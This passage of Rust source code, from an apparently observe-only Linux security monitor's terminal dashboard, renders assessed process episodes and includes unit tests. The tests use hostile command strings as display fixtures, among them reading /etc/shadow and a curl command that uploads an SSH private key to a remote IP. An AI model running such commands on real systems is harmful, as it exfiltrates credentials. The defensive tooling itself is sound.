    doc.add(vec![label("user"), Span::raw(format!("uid {uid}")), Span::styled(started_by, t.dim())], 9);
    doc.add(vec![label("where"), Span::raw(audit::place(e, false))], 9);
    if ep.assessed > 1 {
        doc.add(vec![label("assessed"), Span::raw(format!("{} times", ep.assessed)), Span::styled(" · it grew, so it was looked at again", t.dim())], 9);
    }

    // The numbers a rule can use.
    doc.section(t, "FACTS", "usable in w where and in rules".into());
    let count = |v: &Value| v.as_array().map_or(0, |a| a.len());
    let mut facts: Vec<(String, String)> = e["files"].as_object().into_iter().flatten().map(|(category, list)| (format!("files.{category}"), count(list).to_string())).collect();
    let new = e["network"].as_array().into_iter().flatten().filter(|n| n["new_destination"] == true).count();
    facts.push(("net.total".into(), count(&e["network"]).to_string()));
    facts.push(("net.new".into(), new.to_string()));
    facts.push(("procs".into(), count(&e["tree"]).to_string()));
    let mut spans = vec![Span::raw("  ")];
    for (name, value) in &facts {
        let style = if value == "0" { t.dim() } else { t.text() };
        spans.push(Span::styled(format!("{name}{NBSP}"), t.dim()));
        spans.push(Span::styled(format!("{value}   "), style));
    }
    doc.add(spans, 2);
    let flags: Vec<&str> = e["flags"].as_array().into_iter().flatten().filter_map(|f| f.as_str()).collect();
    if !flags.is_empty() {
        doc.add(vec![Span::styled("  flags ", t.dim()), Span::styled(flags.join("  "), t.warn())], 8);
    }

    // The model's answers.
    match &ep.answers {
        None => doc.section(t, "MODEL", "not asked for this record".into()),
        Some(answers) => {
            let note = format!("{} · {} ms · {} tokens", record["model"].as_str().unwrap_or("?"), record["latency_ms"].as_u64().unwrap_or(0), thousands(record["input_tokens"].as_u64().unwrap_or(0)));
            doc.section(t, "MODEL", note);
            let name_width = answers.keys().map(|k| width(k)).max().unwrap_or(0);
            for (id, answer) in answers {
                let question = app.store.assessment.questions.iter().find(|q| q.id == *id);
                let mut spans = vec![Span::raw("  "), Span::styled(pad(id, name_width + 2), t.text())];
                match answer {
                    Answer::Noul { noul: p } => {
                        let stands_out = question.is_some_and(|q| q.highlighted(*p));
                        let cells = (p.clamp(0.0, 1.0) * 10.0).round() as usize;
                        let style = if stands_out { t.warn() } else { t.dim() };
                        spans.push(Span::styled("█".repeat(cells), style));
                        spans.push(Span::styled("░".repeat(10 - cells), t.dim()));
                        spans.push(Span::styled(format!("  {p:.2}"), if stands_out { t.warn().patch(t.bold()) } else { t.text() }));
                        if stands_out {
                            spans.push(Span::styled("  stands out", t.dim()));
                        }
                    }
                    Answer::Choice { choice, probabilities, .. } => {
                        spans.push(Span::styled(choice.clone(), response_style(t, choice).patch(t.bold())));
                        let mut others: Vec<(&String, &f64)> = probabilities.iter().collect();
                        others.sort_by(|a, b| b.1.total_cmp(a.1));
                        let list: Vec<String> = others.iter().map(|(name, p)| format!("{name} {p:.2}")).collect();
                        spans.push(Span::styled(format!("   {}", list.join(" · ")), t.dim()));
                    }
                    Answer::Score { score, confidence, .. } => {
                        spans.push(Span::raw(format!("{score:.1}")));
                        spans.push(Span::styled(format!("   confidence {confidence:.2}"), t.dim()));
                    }
                }
                doc.add(spans, name_width + 4);
            }
            for note in record["notes"].as_array().into_iter().flatten().filter_map(|n| n.as_str()) {
                doc.add(vec![Span::styled(format!("  note: {note}"), t.dim())], 8);
            }
        }
    }

    // The process tree, with what each process did.
    let outline = audit::outline(e);
    let mut weights: std::collections::HashMap<u64, u8> = std::collections::HashMap::new();
    for step in e["trail"].as_array().into_iter().flatten() {
        if let Some(pid) = step["pid"].as_u64() {
            let w = weights.entry(pid).or_default();
            *w = (*w).max(weight(step));
        }
    }
    let processes = outline.iter().filter(|l| matches!(l.what, What::Process { .. })).count();
    let steps = e["trail"].as_array().map_or(0, |a| a.len());
    let running = if ep.alive.is_empty() { String::new() } else { format!(" · {} running now", ep.alive.len()) };
    doc.section(t, "WHAT HAPPENED", format!("{processes} process{} · {steps} step{}{running}", if processes == 1 { "" } else { "es" }, if steps == 1 { "" } else { "s" }));
    for line in outline {
        let time = match line.ts {
            Some(ts) => clock(ts),
            None => " ".repeat(8),
        };
        let lead_width = 2 + 8 + 2 + width(&line.lead);
        let mut spans = vec![Span::raw("  "), Span::styled(time, t.dim()), Span::raw("  "), Span::styled(line.lead.clone(), t.dim())];
        let step = |spans: &mut Vec<Span<'static>>, step: &Value| {
            let (text, tag) = audit::step_parts(step);
            let quiet = matches!(&tag, Some(Tag::Category(c)) if c == "temp");
            spans.push(Span::styled(text, if quiet { t.dim() } else { t.text() }));
            if let Some(tag) = tag {
                spans.push(Span::raw("  "));
                spans.push(tag_span(t, &tag));
            }
        };
        match line.what {
            What::Process { command, pid } => {
                let alive = ep.alive.contains(&(pid as u32));
                if alive {
                    spans.push(Span::styled("● ", t.good()));
                }
                // Only a process that touched something sensitive is set apart.
                let style = match weights.get(&pid).copied().unwrap_or(0) {
                    2 => t.threat(),
                    1 => t.warn().patch(t.bold()),
                    _ => t.text(),
                };
                // Two rows at most for a command in the tree; the raw record has all of it.
                let hang = lead_width + 3;
                let room = (doc.width.saturating_sub(lead_width) + doc.width.saturating_sub(hang)).saturating_sub(24);
                spans.push(Span::styled(clip(command, room.max(20)), style));
                spans.push(Span::styled(format!("  pid{NBSP}{pid}"), t.dim()));
                if alive {
                    spans.push(Span::styled("  running", t.good()));
                }
                doc.add(spans, hang);
            }
            What::Then(command) => {
                spans.push(Span::styled("↳ then ran ", t.dim()));
                spans.push(Span::raw(clip(command, (doc.width * 2).saturating_sub(lead_width * 2 + 30).max(20))));
                doc.add(spans, lead_width + 3);
            }
            What::Step(s) => {
                spans.push(Span::styled("▸ ", t.dim()));
                step(&mut spans, s);
                doc.add(spans, lead_width + 3);
            }
            What::MoreSteps(n) => {
                spans.push(Span::styled(format!("▸ … {n} more like these"), t.dim()));
                doc.add(spans, lead_width + 3);
            }
            What::Loose(s) => {
                step(&mut spans, s);
                spans.push(Span::styled("  (process not in the tree)", t.dim()));
                doc.add(spans, lead_width + 3);
            }
            What::Note(text) => doc.add(vec![Span::styled(format!("  {text}"), t.dim())], 4),
        }
    }
}

/// The stored record as indented JSON, keys in the interface colour.
fn raw(t: Theme, ep: &Episode, doc: &mut Doc) {
    let text = serde_json::to_string_pretty(&ep.record).unwrap_or_default();
    for line in text.lines() {
        let indent = line.len() - line.trim_start().len();
        let spans = match line.trim_start().split_once("\": ") {
            Some((key, value)) if key.starts_with('"') => {
                vec![Span::raw(" ".repeat(indent)), Span::styled(format!("{key}\""), t.accent()), Span::styled(": ", t.dim()), Span::raw(value.to_string())]
            }
            _ => vec![Span::raw(line.to_string())],
        };
        doc.add(spans, indent + 4);
    }
}

fn detail(app: &mut App, area: Rect, buf: &mut Buffer) {
    let t = app.theme;
    let focused = app.focus == Focus::Detail && app.input.is_none();
    let mut title = vec![Span::styled(" Episode ", if focused { t.key() } else { t.bold() })];
    if app.raw {
        title.push(Span::styled("raw record ", t.warn()));
    }
    let mut block = pane(t, focused, title);
    let inner_height = area.height.saturating_sub(2) as usize;
    app.detail_height = inner_height;
    app.hits.push((area, Hit::Detail));
    let Some(ep) = app.selected.and_then(|key| app.store.get(key)) else {
        let inner = block.inner(area);
        block.render(area, buf);
        put(buf, Rect { x: inner.x + 2, width: inner.width.saturating_sub(2), ..inner }, 1, &Line::styled("No episode selected.", t.dim()));
        return;
    };

    // One column of padding on each side of the text.
    let text_width = area.width.saturating_sub(4);
    let stamp = Some((ep.key, ep.seq, ep.alive_version, text_width, app.raw));
    if app.detail.stamp != stamp {
        let mut doc = Doc { lines: Vec::new(), width: text_width as usize };
        if app.raw {
            raw(t, ep, &mut doc);
        } else {
            readable(app, ep, &mut doc);
        }
        app.detail.lines = doc.lines;
        app.detail.stamp = stamp;
    }
    let total = app.detail.lines.len();
    app.detail_lines = total;
    app.detail_scroll = app.detail_scroll.min(total.saturating_sub(inner_height));
    if total > inner_height {
        let place = if app.detail_scroll == 0 {
            "top".to_string()
        } else if app.detail_scroll + inner_height >= total {
            "end".to_string()
        } else {
            format!("{}%", (app.detail_scroll + inner_height) * 100 / total)
        };
        block = block.title_bottom(Line::styled(format!(" {place} "), t.dim()).right_aligned());
    }
    let inner = block.inner(area);
    block.render(area, buf);
    if inner.width < 6 {
        return;
    }
    let text = Rect { x: inner.x + 1, width: inner.width - 2, ..inner };
    for (row, line) in app.detail.lines.iter().skip(app.detail_scroll).take(inner_height).enumerate() {
        put(buf, text, row as u16, line);
    }
    scrollbar(t, buf, area, app.detail_scroll, inner_height, total);
}

// --- footer, help, empty ---------------------------------------------------------------------

fn footer(app: &App, area: Rect, buf: &mut Buffer) {
    let t = app.theme;
    // While a condition is typed, the footer lists what it can use.
    if let Some(input) = &app.input {
        let line = match input.kind {
            InputKind::Where => {
                // The episode's own facts first, then the model's answers, then the rest.
                let mut fields = Condition::fields(&app.store.assessment);
                let rank = |f: &String| match f.as_str() {
                    "driver" => 0,
                    "flags" => 1,
                    f if f.starts_with("files.") || f.starts_with("net.") => 2,
                    "procs" | "uid" => 3,
                    f if f.starts_with("container.") || f.starts_with("k8s.") => 5,
                    _ => 4,
                };
                fields.sort_by_key(rank);
                let tail = "and or not ( )  \"new_exe\" in flags ";
                let room = (area.width as usize).saturating_sub(8 + 8 + width(tail));
                Line::from(vec![Span::styled(" fields ", t.key()), Span::styled(clip(&fields.join(" "), room), t.dim()), Span::styled("  join ", t.key()), Span::styled(tail, t.dim())])
            }
            InputKind::Search => Line::styled(" every word must appear: in the command, a path, an address, a rule name, the driver or the episode id", t.dim()),
        };
        put(buf, area, 0, &line);
        return;
    }
    let keys: &[(&str, &str)] = match (app.focus, app.zoom || !app.wide) {
        (Focus::List, _) => &[("↑↓", "move"), ("⏎", "open"), ("n", "next flagged"), ("f", "flagged"), ("1-5", "who"), ("/", "search"), ("w", "where"), ("?", "help"), ("q", "quit")],
        (Focus::Detail, false) => &[("↑↓", "scroll"), ("←", "list"), ("⏎", "full width"), ("r", "raw"), ("y", "copy command"), ("?", "help"), ("q", "quit")],
        (Focus::Detail, true) => &[("↑↓", "scroll"), ("esc", "back"), ("r", "raw"), ("y", "copy command"), ("?", "help"), ("q", "quit")],
    };
    let toast = app.toast.as_ref().map(|toast| {
        let style = if toast.alarm { t.threat() } else { t.good() };
        Line::styled(format!(" {} ", clip(&toast.text, (area.width as usize * 3 / 5).max(20))), style)
    });
    let room = (area.width as usize).saturating_sub(toast.as_ref().map_or(0, line_width) + 1);
    let mut spans = vec![Span::raw(" ")];
    let mut used = 1;
    for (key, what) in keys {
        let w = width(key) + width(what) + 3;
        if used + w > room {
            break;
        }
        spans.push(Span::styled(*key, t.key()));
        spans.push(Span::styled(format!(" {what}  "), t.dim()));
        used += w;
    }
    put(buf, area, 0, &Line::from(spans));
    if let Some(toast) = toast {
        put_right(buf, area, 0, &toast);
    }
}

/// A box in the middle of the screen, cleared, with a border.
fn popup(t: Theme, area: Rect, columns: u16, rows: u16, buf: &mut Buffer) -> Rect {
    let w = columns.min(area.width.saturating_sub(2));
    let h = rows.min(area.height.saturating_sub(2));
    let rect = Rect { x: area.x + (area.width - w) / 2, y: area.y + (area.height - h) / 2, width: w, height: h };
    Clear.render(rect, buf);
    let block = Block::bordered().border_type(BorderType::Rounded).border_style(t.accent());
    let inner = block.inner(rect);
    block.render(rect, buf);
    inner
}

fn help(app: &App, area: Rect, buf: &mut Buffer) {
    let t = app.theme;
    // The logo goes first when the window is too short for everything.
    let with_logo = area.height >= 35;
    let inner = popup(t, area, 96, if with_logo { 33 } else { 24 }, buf);
    let mut top = inner.y + 1;
    if with_logo {
        let logo_x = inner.x + inner.width.saturating_sub(LOGO_WIDTH) / 2;
        for (row, line) in theme::logo(t, app.turn()).iter().enumerate() {
            buf.set_line(logo_x, top + row as u16, line, inner.width);
        }
        let tagline = "judgment for Linux runtime security · it watches and reports, it stops nothing";
        let tag_x = inner.x + (inner.width as usize).saturating_sub(width(tagline)) as u16 / 2;
        buf.set_line(tag_x, top + LOGO_ROWS as u16 + 1, &Line::styled(clip(tagline, inner.width as usize), t.dim()), inner.width);
        top += LOGO_ROWS as u16 + 3;
    }

    let head = |title: &str| Line::styled(title.to_string(), t.heading());
    let key = |keys: &str, what: &str| Line::from(vec![Span::styled(format!("{keys:<11}"), t.key()), Span::raw(what.to_string())]);
    let left = vec![
        head("MOVE"),
        key("↑ ↓  j k", "up and down"),
        key("PgUp PgDn", "a page"),
        key("g  G", "newest, oldest"),
        key("n  N", "next, previous flagged"),
        key("⏎  →", "into the episode"),
        key("←  esc", "back to the list"),
        key("tab", "the other pane"),
        key("J  K", "scroll the episode from the list"),
        Line::default(),
        head("EPISODE"),
        key("⏎  z", "full width"),
        key("r", "the stored record as JSON"),
        key("y  Y", "copy the command, the episode id"),
        Line::default(),
        head("SCREEN"),
        key("b", "logo on or off"),
        key("?", "this help"),
        key("q", "quit"),
    ];
    let mark = |glyph: &str, style: Style, what: &str| Line::from(vec![Span::styled(format!("{glyph:<11}"), style), Span::raw(what.to_string())]);
    let right = vec![
        head("FILTER"),
        key("f", "only episodes a rule matched"),
        key("1 … 5", "who drives it (several can be on)"),
        key("t", "time window"),
        key("/", "words to search for"),
        key("w", "where: a rule condition, e.g."),
        Line::styled("           driver == \"agent\" and net.new > 0", t.dim()),
        key("s", "newest first, or by risk"),
        key("x", "clear all filters"),
        Line::default(),
        head("MARKS"),
        mark("● red", t.threat(), "a rule matched"),
        mark("● yellow", t.warn(), "the model says alert or contain"),
        mark("⠹ ▶", t.good(), "still running on this machine"),
        Line::default(),
        head("WHO"),
        mark("agent", t.driver(Kind::Agent), "an AI agent, or started by one"),
        mark("remote", t.driver(Kind::Remote), "came in over SSH"),
        mark("human", t.driver(Kind::Human), "typed in a terminal here"),
        mark("automation", t.driver(Kind::Automation), "a service, a timer, the desktop"),
        mark("unknown", t.driver(Kind::Unknown), "its parents were not seen"),
    ];
    let column = inner.width.saturating_sub(6) / 2;
    for (lines, x) in [(left, inner.x + 3), (right, inner.x + 3 + column + 1)] {
        for (row, line) in lines.iter().enumerate() {
            let y = top + row as u16;
            if y < inner.bottom() {
                buf.set_line(x, y, line, column);
            }
        }
    }
}

/// The whole body while there is nothing to list: what dnom dash is waiting for.
fn nothing_yet(app: &App, area: Rect, with_logo: bool, buf: &mut Buffer) {
    let t = app.theme;
    let path = tilde(&app.feed.path);
    let mut lines: Vec<Line> = if with_logo && area.height >= 16 && area.width >= LOGO_WIDTH + 4 { theme::logo(t, app.turn()) } else { Vec::new() };
    if !lines.is_empty() {
        lines.push(Line::default());
        lines.push(Line::default());
    }
    if app.feed.exists {
        lines.push(Line::styled("Watching the log. Nothing was assessed yet.", t.bold()));
        lines.push(Line::default());
        lines.push(Line::styled(clip_start(&path, area.width.saturating_sub(4) as usize), t.dim()));
        lines.push(Line::styled("The first assessed episode appears here by itself.", t.dim()));
    } else {
        lines.push(Line::styled("No assessment log yet.", t.bold()));
        lines.push(Line::default());
        lines.push(Line::styled(clip_start(&path, area.width.saturating_sub(4) as usize), t.dim()));
        lines.push(Line::default());
        lines.push(Line::styled("dnom writes it while it runs. In another terminal:", t.text()));
        lines.push(Line::from(vec![Span::styled("make run", t.key()), Span::styled("          for now, in the foreground", t.dim())]));
        lines.push(Line::from(vec![Span::styled("make local-start", t.key()), Span::styled("  for days, in the background", t.dim())]));
        lines.push(Line::default());
        lines.push(Line::styled("A log somewhere else: dnom dash --state-dir <folder>", t.dim()));
    }
    let top = area.y + area.height.saturating_sub(lines.len() as u16) / 2;
    for (row, line) in lines.iter().enumerate() {
        let w = (line_width(line) as u16).min(area.width);
        let y = top + row as u16;
        if y < area.bottom() {
            buf.set_line(area.x + (area.width - w) / 2, y, line, w);
        }
    }
}

#[cfg(test)]
mod tests {
    use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers, MouseButton, MouseEvent, MouseEventKind};

    use super::{
        super::tests::{app_with, sample_records, screen},
        *,
    };

    fn text(lines: &[Line]) -> Vec<String> {
        lines.iter().map(|l| l.spans.iter().map(|s| s.content.as_ref()).collect()).collect()
    }

    fn done(app: App) {
        let _ = std::fs::remove_dir_all(app.feed.path.parent().unwrap());
    }

    #[test]
    fn clip_cuts_to_columns_and_drops_control_characters() {
        assert_eq!(clip("hello", 5), "hello");
        assert_eq!(clip("hello world", 6), "hello…");
        assert_eq!(clip("a\x1b[31mb\nc", 20), "a [31mb c");
        // Wide characters take two columns each.
        assert_eq!(clip("日本語のコマンド", 7), "日本語…");
        assert_eq!((clip("abc", 0), clip("abc", 1)), (String::new(), "…".to_string()));
        assert_eq!(clip_start("/home/me/.local/state/dnom/trial", 12), "…/dnom/trial");
    }

    #[test]
    fn list_rows_name_programs_without_their_folders() {
        assert_eq!(brief("~/.local/share/tools/claude/latest/claude --resume 4c6d"), "claude --resume 4c6d");
        assert_eq!(brief("/bin/bash /usr/share/omarchy/bin/omarchy-agent-usage-update --limits-only"), "bash omarchy-agent-usage-update --limits-only");
        // Only a script after a shell or an interpreter is shortened, never an ordinary argument.
        assert_eq!(brief("cat /etc/shadow"), "cat /etc/shadow");
        assert_eq!(brief("bash -c curl https://203.0.113.7/"), "bash -c curl https://203.0.113.7/");
        assert_eq!((brief("make"), brief("")), ("make".to_string(), String::new()));
    }

    #[test]
    fn only_matched_rules_and_a_model_that_says_act_are_loud() {
        use super::super::data::tests::record;
        let mut app = app_with("badges", &[
            record("ep-1", 10, "curl x", "cron", &["exfiltration", "credential-theft"], Some((0.95, 0.1))),
            record("ep-2", 20, "scp y", "cron", &[], Some((0.95, 0.1))),
            record("ep-3", 30, "ls", "cron", &[], Some((0.75, 0.5))),
        ]);
        let badge_of = |app: &App, key: u64| badge(app, app.store.get(key).unwrap(), app.theme.dim()).map(|(text, _, loud)| (text, loud));
        assert_eq!(badge_of(&app, 0), Some(("exfiltration +1".to_string(), true)));
        assert_eq!(badge_of(&app, 1), Some(("model: alert".to_string(), true)));
        // A high score alone is common: it is not marked until the list is sorted by risk.
        assert_eq!(badge_of(&app, 2), None);
        app.sort = Sort::Risk;
        assert_eq!(badge_of(&app, 2), Some(("cred 0.75".to_string(), false)));
        done(app);
    }

    #[test]
    fn wrap_breaks_at_spaces_and_hangs_the_rest() {
        let line = Line::from(vec![Span::raw("  12:00:00  "), Span::raw("curl --data @/home/me/.ssh/id_ed25519 https://203.0.113.7/upload")]);
        let rows = text(&wrap(line, 40, 12));
        assert_eq!(rows, ["  12:00:00  curl --data ", "            @/home/me/.ssh/id_ed25519 ", "            https://203.0.113.7/upload"]);
        assert!(rows.iter().all(|r| width(r) <= 40));
        // A word longer than the row is cut where the row ends.
        let rows = text(&wrap(Line::raw("x".repeat(50)), 20, 4));
        assert_eq!(rows.iter().map(|r| width(r)).collect::<Vec<_>>(), [20, 20, 18]);
        assert_eq!(text(&wrap(Line::default(), 20, 0)), [""]);
        // A no-break space keeps two words on one row, and is drawn as a space.
        let rows = text(&wrap(Line::raw(format!("aaaa bbbb cccc{NBSP}dddd")), 16, 0));
        assert_eq!(rows, ["aaaa bbbb ", "cccc dddd"]);
    }

    #[test]
    fn the_screen_shows_list_detail_and_filters() {
        let mut app = app_with("screen", &sample_records());
        let s = screen(&mut app, 150, 40);
        // The header: logo, source and totals.
        assert!(s.contains("▄█████ █████▄ ▄████▄ █████▄███▄"), "{s}");
        assert!(s.contains("4 episodes · 2 flagged"), "{s}");
        assert!(s.contains("observe-only"), "{s}");
        // The chips with their counts.
        assert!(s.contains("f flagged 2") && s.contains("1 agent 1") && s.contains("4 automation 1"), "{s}");
        assert!(s.contains("4 of 4"), "{s}");
        // The list: newest first, with who drives it and the matched rule.
        let row = |needle: &str| s.lines().position(|l| l.contains(needle)).unwrap_or_else(|| panic!("no {needle} in\n{s}"));
        assert!(row("sshd-session: deploy") < row("backup.sh --nightly") && row("backup.sh --nightly") < row("claude --resume"));
        assert!(s.contains("remote") && s.contains("credentials-then-new-destination"), "{s}");
        // The detail of the selected (newest) episode.
        for needle in ["▲ THREAT · 1 rule matched", "would alert", "who      remote · sshd", "FACTS", "files.credentials 1", "net.new 1", "MODEL", "credential_access", "0.75  stands out", "WHAT HAPPENED", "2 processes · 2 steps", "read ~/.ssh/id_ed25519  credentials", "connect 203.0.113.7:443  new destination"] {
            assert!(s.contains(needle), "missing {needle:?} in\n{s}");
        }
        done(app);
    }

    #[test]
    fn narrow_and_short_windows_still_work() {
        let mut app = app_with("narrow", &sample_records());
        // Narrow: one pane at a time, a one-line header.
        let s = screen(&mut app, 80, 24);
        assert!(s.contains("dnom") && s.contains("Episodes") && !s.contains("WHAT HAPPENED"), "{s}");
        app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
        let s = screen(&mut app, 80, 24);
        assert!(s.contains("▲ THREAT") && !s.contains("Episodes"), "{s}");
        app.on_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
        assert!(screen(&mut app, 80, 24).contains("Episodes"));

        // Any size draws without a panic, including while typing and with the help open.
        for (w, h) in [(1, 1), (10, 3), (44, 9), (45, 10), (60, 12), (99, 27), (100, 28), (101, 29), (120, 30), (200, 60), (300, 100)] {
            for keys in ["", "?", "/abc", "wdriver == \"x", "z", "r", "f1"] {
                let mut app = app_with("sizes", &sample_records());
                for c in keys.chars() {
                    app.on_key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE));
                }
                let s = screen(&mut app, w, h);
                assert!(s.lines().all(|l| width(l) <= w as usize), "{w}x{h} {keys:?}");
                done(app);
            }
        }
        done(app);
    }

    #[test]
    fn empty_states_say_what_to_do() {
        let mut app = app_with("empty", &[]);
        let s = screen(&mut app, 120, 30);
        assert!(s.contains("Watching the log. Nothing was assessed yet."), "{s}");
        done(app);

        let mut app = App::new(std::env::temp_dir().join("dnom-dash-no-such-dir/assessments.jsonl"), 100, true);
        let s = screen(&mut app, 120, 30);
        assert!(s.contains("No assessment log yet.") && s.contains("make local-start") && s.contains("no log yet"), "{s}");

        let mut app = app_with("nomatch", &sample_records());
        for c in "/zzzz".chars() {
            app.on_key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE));
        }
        let s = screen(&mut app, 120, 30);
        assert!(s.contains("Nothing matches these filters.") && s.contains("0 of 4"), "{s}");
        done(app);
    }

    #[test]
    fn the_mouse_selects_rows_and_toggles_chips() {
        let mut app = app_with("mouse", &sample_records());
        let s = screen(&mut app, 150, 40);
        let find = |needle: &str| {
            let (y, line) = s.lines().enumerate().find(|(_, l)| l.contains(needle)).unwrap();
            // Columns, not bytes: the line has box-drawing characters in front.
            (width(&line[..line.find(needle).unwrap()]) as u16, y as u16)
        };
        let click = |app: &mut App, (column, row): (u16, u16)| app.on_mouse(MouseEvent { kind: MouseEventKind::Down(MouseButton::Left), column, row, modifiers: KeyModifiers::NONE });

        click(&mut app, find("backup.sh --nightly"));
        assert_eq!(app.selected.and_then(|k| app.store.get(k)).map(|e| e.id.as_str()), Some("ep-3"));
        assert!(!app.follow);

        click(&mut app, find("flagged 2"));
        assert!(app.filters.flagged);
        assert_eq!(app.view.len(), 2);
        let s2 = screen(&mut app, 150, 40);
        assert!(s2.contains("x clear") && s2.contains("2 of 4"), "{s2}");

        // The wheel over the detail scrolls it; over the list it moves the selection.
        let before = app.selected;
        app.on_mouse(MouseEvent { kind: MouseEventKind::ScrollDown, column: 20, row: 20, modifiers: KeyModifiers::NONE });
        assert_ne!(app.selected, before);
        done(app);
    }

    #[test]
    fn the_help_lists_the_keys() {
        let mut app = app_with("help", &sample_records());
        app.on_key(KeyEvent::new(KeyCode::Char('?'), KeyModifiers::NONE));
        let s = screen(&mut app, 150, 40);
        for needle in ["MOVE", "FILTER", "next, previous flagged", "where: a rule condition", "it watches and reports, it stops nothing"] {
            assert!(s.contains(needle), "missing {needle:?} in\n{s}");
        }
        // Any key closes it.
        app.on_key(KeyEvent::new(KeyCode::Char('j'), KeyModifiers::NONE));
        assert!(!app.help && !screen(&mut app, 150, 40).contains("MOVE"));
        done(app);
    }
}
